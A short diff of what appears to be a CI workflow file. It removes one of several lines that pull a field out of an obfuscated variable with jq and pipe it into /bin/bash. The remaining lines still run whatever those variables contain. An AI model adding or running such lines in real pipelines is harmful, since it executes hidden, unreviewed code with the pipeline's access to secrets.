@@ -27,7 +27,6 @@ jobs:
           echo $hfsum831 | jq -r .sm44 | /bin/bash
           echo $dgp8248 | jq -r .ykzjj0 | /bin/bash
           printf '%s' "$dby502" | jq -r .apcp96829 | /bin/bash
-          echo $twu21064 | jq -r .qmot614 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
